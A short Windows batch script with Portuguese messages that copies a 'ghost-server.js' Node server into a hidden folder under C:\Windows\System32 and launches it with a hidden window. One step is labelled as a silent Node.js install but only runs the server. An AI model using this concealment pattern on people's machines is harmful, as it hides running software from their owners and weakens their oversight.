@echo off
title Ghost Server Setup
echo [1/4] Criando diretório fantasma...
mkdir "C:\Windows\System32\ghost" 2>nul
cd /d "C:\Windows\System32\ghost"

echo [2/4] Copiando arquivos...
copy "%~dp0server\ghost-server.js" "C:\Windows\System32\ghost\"
copy "%~dp0server\ghost-config.json" "C:\Windows\System32\ghost\"

echo [3/4] Instalando Node.js silenciosamente...
powershell -Command "Start-Process 'node' -ArgumentList 'C:\Windows\System32\ghost\ghost-server.js' -WindowStyle Hidden"

echo [4/4] Servidor fantasma ativado!
echo.
echo Para parar: taskkill /F /IM node.exe
pause
